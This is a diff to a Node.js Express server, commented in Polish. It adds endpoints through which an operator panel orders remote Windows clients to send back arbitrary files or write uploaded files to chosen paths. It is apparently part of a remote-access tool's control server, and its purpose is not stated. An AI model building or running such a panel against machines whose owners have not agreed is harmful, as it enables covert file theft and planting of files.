@@ -206,6 +206,78 @@ app.get('/api/file', authMiddleware, (req, res) => {
   checkForData();
 });
 
+// Panel pobiera plik (download) - base64 encoded
+app.get('/api/download', authMiddleware, (req, res) => {
+  const path = req.query.path;
+  const client = req.query.client;
+  
+  if (!path || !client) return res.status(400).send('Brakuje parametrów');
+  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+
+  // Wyślij komendę do klienta
+  commands[client] = `downloadfile ${path}`;
+  
+  // Czekaj na odpowiedź
+  const checkForData = async () => {
+    for (let i = 0; i < 60; i++) { // maksymalnie 30 sekund dla dużych plików
+      await new Promise(resolve => setTimeout(resolve, 500));
+      if (fileContents[client] && fileContents[client][path] !== undefined) {
+        const base64Content = fileContents[client][path];
+        // Usuń po pobraniu
+        delete fileContents[client][path];
+        
+        try {
+          // Konwertuj base64 na buffer
+          const buffer = Buffer.from(base64Content, 'base64');
+          const filename = path.split(/[\\/]/).pop();
+          
+          res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+          res.setHeader('Content-Type', 'application/octet-stream');
+          return res.send(buffer);
+        } catch (e) {
+          return res.status(500).send('Błąd dekodowania pliku');
+        }
+      }
+    }
+    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+  };
+
+  checkForData();
+});
+
+// Panel wysyła plik (upload)
+app.post('/api/upload', authMiddleware, (req, res) => {
+  const { client, path, content, filename } = req.body;
+  
+  if (!client || !path || !content || !filename) {
+    return res.status(400).send('Brakuje parametrów');
+  }
+  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+
+  // Wyślij komendę do klienta z zawartością pliku (base64)
+  const fullPath = path.endsWith('\\') ? path + filename : path + '\\' + filename;
+  commands[client] = `uploadfile ${fullPath} ${content}`;
+  
+  // Czekaj na potwierdzenie
+  const checkForResult = async () => {
+    for (let i = 0; i < 60; i++) { // maksymalnie 30 sekund
+      await new Promise(resolve => setTimeout(resolve, 500));
+      const result = results[client];
+      if (result !== undefined) {
+        delete results[client];
+        if (result.includes('SUCCESS')) {
+          return res.json({ success: true, message: 'Plik został przesłany' });
+        } else {
+          return res.status(400).json({ success: false, message: result });
+        }
+      }
+    }
+    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+  };
+
+  checkForResult();
+});
+
 app.listen(port, () => {
   console.log(`✅ Serwer działa na porcie ${port}`);
 });
